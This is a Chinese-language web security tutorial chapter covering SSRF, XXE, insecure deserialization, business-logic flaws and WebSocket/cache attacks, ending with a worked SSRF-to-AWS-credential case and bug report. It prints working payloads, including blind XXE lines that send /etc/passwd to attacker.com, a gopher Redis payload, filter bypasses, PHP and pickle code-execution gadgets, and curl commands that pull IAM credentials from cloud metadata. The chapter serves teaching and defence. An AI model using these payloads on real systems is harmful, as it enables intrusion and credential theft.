## 11.1 SSRF（服务端请求伪造）

### 11.1.1 原理与危害

**SSRF**（Server-Side Request Forgery）是攻击者诱导服务器发起任意请求的漏洞。

**危害**：
- 内网探测（扫描内网端口）
- 访问内网服务（Redis、MySQL、Elasticsearch）
- 绕过访问控制（访问受限资源）
- 攻击内网应用（Redis 未授权访问、FastCGI、...）

### 11.1.2 常见场景

**1. 图片/文件下载功能**

```php
// vuln.php
<?php
$url = $_GET['url'];
$image = file_get_contents($url);
echo $image;
?>

http://vuln-web.com/vuln.php?url=http://169.254.169.254/latest/meta-data/  # AWS 元数据
```

**2. Webhook 功能**

```php
// webhook.php
<?php
$url = $_POST['webhook_url'];
$result = file_get_contents($url);  // 服务器发起请求
?>
```

**3. PDF 生成功能**

```php
// pdf.php
<?php
$html = $_POST['html'];
// 使用 wkhtmltopdf 生成 PDF，会请求 HTML 中的资源
$html = "<img src='http://169.254.169.254/latest/meta-data/'>";
?>
```

### 11.1.3 利用技术

#### 1. 内网探测

**端口扫描**：
```bash
# 探测 192.168.1.1:80
http://vuln-web.com/vuln.php?url=http://192.168.1.1:80

# 根据响应时间判断端口是否开放
```

**协议利用**：
```
file://   - 读取本地文件
dict://   - 探测端口（如 Redis）
gopher:// - 发送任意 TCP 数据（Redis、MySQL）
```

#### 2. 攻击 Redis

**Redis 未授权访问**：
```bash
# 使用 gopher 协议写入 SSH 公钥
gopher://192.168.1.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$...
```

#### 3. 绕过过滤

**黑名单绕过**：
```
http://vuln.com → http://vuln.com@evil.com  # @ 绕过
http://127.0.0.1 → http://0x7f000001  # 十六进制 IP
http://127.0.0.1 → http://2130706433  # 十进制 IP
http://127.0.0.1 → http://localhost  # 域名解析
```

**DNS 重绑定**：
1. 控制域名 `attacker.com`
2. 第一次解析到 `93.184.216.34`（白名单 IP）
3. 第二次解析到 `127.0.0.1`（内网 IP）

## 11.2 XXE（XML 外部实体注入）

### 11.2.1 原理与危害

**XXE**（XML External Entity）是 XML 解析器未禁用外部实体，导致攻击者可以读取本地文件、发起网络请求的漏洞。

**危害**：
- 读取本地文件（`/etc/passwd`、`config.php`）
- SSRF（类似上一节）
- DoS（Billion Laughs 攻击）

### 11.2.2 基础知识

**XML 实体**：
```xml
<!ENTITY entity_name "entity_value">
```

**外部实体**：
```xml
<!ENTITY entity_name SYSTEM "file:///etc/passwd">
```

**参数实体**（在 DTD 中使用）：
```xml
<!ENTITY % entity_name SYSTEM "http://attacker.com/evil.dtd">
%entity_name;
```

### 11.2.3 利用技术

#### 1. 读取本地文件

**经典 XXE**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**带外 XXE（OOB-XXE）**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=%file;">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>
```

#### 2. 盲 XXE（Blind XXE）

**原理**：无回显，通过带外通道外带数据。

**利用**：
```xml
<!-- 在攻击者服务器上托管 evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%oob;
```

**受害者解析 XML**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

攻击者在 `http://attacker.com/?data=root:x:0:0:...` 收到文件内容。

### 11.2.4 防御措施

**禁用外部实体**（PHP）：
```php
libxml_disable_entity_loader(true);
```

**使用 JSON 替代 XML**（推荐）

## 11.3 不安全的反序列化

### 11.3.1 原理与危害

**反序列化漏洞**是程序在反序列化不可信数据时，触发恶意对象执行代码的漏洞。

**危害**：
- 远程代码执行（RCE）
- 权限提升
- 数据篡改

### 11.3.2 Java 反序列化

**原理**：Java 反序列化时会自动调用对象的 `readObject()` 方法。

**危险 Gadget**：
- `Apache Commons Collections`
- `Spring Framework`
- `Jackson`

**利用工具**：
- `ysoserial`（生成恶意序列化对象）

**示例**：
```bash
java -jar ysoserial.jar CommonsCollections5 "id" > payload.ser
```

### 11.3.3 PHP 反序列化

**原理**：PHP 反序列化时会调用对象的 `__wakeup()` 或 `__destruct()` 魔术方法。

**危险方法**：
- `__wakeup()`：反序列化时调用
- `__destruct()`：对象销毁时调用
- `__toString()`：对象被当作字符串使用时调用

**示例**：
```php
class Evil {
    public $cmd;
    
    function __destruct() {
        system($this->cmd);
    }
}

$obj = new Evil();
$obj->cmd = "id";
$payload = serialize($obj);
echo $payload;

// 输出：O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
```

**利用**：
```php
// vuln.php
<?php
$data = $_GET['data'];
unserialize(base64_decode($data));
?>

http://vuln-web.com/vuln.php?data=TzoxMDoiRXZpbCI6Mjp7czo4OiIARXZpbAAoczo4OiIARXZpbAAo
```

### 11.3.4 Python Pickle 反序列化

**原理**：Python 的 `pickle` 模块反序列化时会执行任意代码。

**危险**：`pickle` 不是安全协议，不要反序列化不可信数据。

**利用**：
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
print(payload)
```

**防御**：
- 使用 `json`（不执行代码）
- 使用 `hmac` 签名序列化数据

## 11.4 业务逻辑漏洞

### 11.4.1 越权与 IDOR

**越权**（Broken Access Control）是用户能够执行超出其权限的操作。

**类型**：

| 类型 | 说明 |
|------|------|
| 水平越权 | 用户 A 访问用户 B 的资源 |
| 垂直越权 | 普通用户执行管理员操作 |
| 上下文越权 | 未完成前一步骤，直接执行后一步骤 |

**IDOR**（Insecure Direct Object Reference）是越权的一种，通过修改参数访问其他用户的资源。

**示例**：
```
正常：/api/user/1001/profile
越权：/api/user/1002/profile  # 访问其他用户资料
```

### 11.4.2 支付绕过

**常见漏洞**：

**1. 价格篡改**：
```
POST /api/order HTTP/1.1
{"product_id": 123, "quantity": 1, "price": 100}

绕过：修改 price 参数为 0.01
```

**2. 数量篡改**：
```
{"product_id": 123, "quantity": -1}  # 负数数量
```

**3. 重复使用优惠券**：
```
POST /api/order HTTP/1.1
{"coupon_id": 100}

绕过：截获请求，重复提交
```

**4. 付款步骤跳过**：
```
1. /checkout → 2. /payment → 3. /confirm

绕过：直接访问 /confirm
```

### 11.4.3 验证码与速率限制绕过

**验证码绕过**：

**1. 验证码复用**：
```
第一次：/captcha → 返回 captcha_id=abc123
第二次：使用相同的 captcha_id
```

**2. 验证码爆破**：
```
使用脚本批量请求：captcha=0000 ~ 9999
```

**3. OCR 识别**：
```
使用 Tesseract 识别验证码图片
```

**速率限制绕过**：

**1. IP 轮换**：
```
使用代理池，每个 IP 发送少量请求
```

**2. 用户 ID 轮换**：
```
使用多个账号，每个账号发送少量请求
```

**3. 修改请求参数**：
```
添加 X-Forwarded-For: 随机IP
```

## 11.5 WebSocket 与 WebCache 漏洞

### 11.5.1 WebSocket 漏洞

**WebSocket** 是全双工通信协议，存在以下漏洞：

**1. 未授权访问**：
```javascript
// 前端代码
ws = new WebSocket("ws://vuln-web.com/chat");
ws.onmessage = function(e) { console.log(e.data); };
```

**2. 输入未过滤**：
```javascript
// 服务端代码
ws.on('message', function(message) {
    io.emit('chat', message);  // 未过滤，XSS！
});
```

**3. 跨站 WebSocket 劫持（CSWH）**：
```html
<!-- 恶意页面 -->
<script>
ws = new WebSocket("ws://vuln-web.com/chat");
ws.onopen = function() {
    ws.send("admin: command");  // 利用受害者的会话
};
</script>
```

### 11.5.2 WebCache 欺骗

**原理**：攻击者诱导缓存服务器缓存敏感页面，其他用户访问时返回缓存内容。

**示例**：
```
1. 攻击者访问：/profile.php?user=admin
2. 响应包含敏感信息，被缓存服务器缓存
3. 其他用户访问：/profile.php?user=admin
4. 返回缓存的敏感信息
```

**防御**：
- 对含用户特定内容的页面设置 `Cache-Control: no-cache`
- 使用 `Vary: Cookie` 头

## 11.6 实战案例：SSRF 到 RCE

### 11.6.1 漏洞发现

**目标**：某云服务提供商的图片处理 API

**端点**：`https://api.cloudservice.com/v1/image/resize?url=`

**测试**：
```bash
curl "https://api.cloudservice.com/v1/image/resize?url=http://169.254.169.254/latest/meta-data/"
```

**响应**：
```xml
<Image>
  <Error>Failed to fetch image: 169.254.169.254</Error>
  <MetaData>
    <instance-id>i-12345678</instance-id>
    <instance-type>t2.micro</instance-type>
    ...
  </MetaData>
</Image>
```

**确认漏洞**：SSRF（可访问 AWS 元数据）

### 11.6.2 漏洞利用

**步骤**：

1. **获取 IAM 凭证**：
   ```bash
   curl "https://api.cloudservice.com/v1/image/resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   ```
   返回：`default-role`

2. **获取临时凭证**：
   ```bash
   curl "https://api.cloudservice.com/v1/image/resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/default-role"
   ```
   返回：
   ```json
   {
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "...",
     "Expiration": "2024-..."
   }
   ```

3. **使用凭证访问 S3**：
   ```bash
   aws configure set aws_access_key_id ASIA...
   aws configure set aws_secret_access_key ...
   aws configure set aws_session_token ...
   
   aws s3 ls  # 列出所有 bucket
   aws s3 cp s3://secret-bucket/flag.txt .  # 下载文件
   ```

### 11.6.3 编写漏洞报告

**标题**：SSRF 漏洞 in api.cloudservice.com/v1/image/resize

**危害评级**：严重（CVSS 9.0）

**复现步骤**：
1. 访问 `https://api.cloudservice.com/v1/image/resize?url=http://169.254.169.254/latest/meta-data/`
2. 获取 AWS 元数据
3. 使用元数据中的凭证访问 S3 bucket

**修复建议**：
1. 禁用 URL 参数中的内网 IP
2. 使用白名单限制可访问的 URL
3. 禁用 AWS 元数据服务（如果不需要）
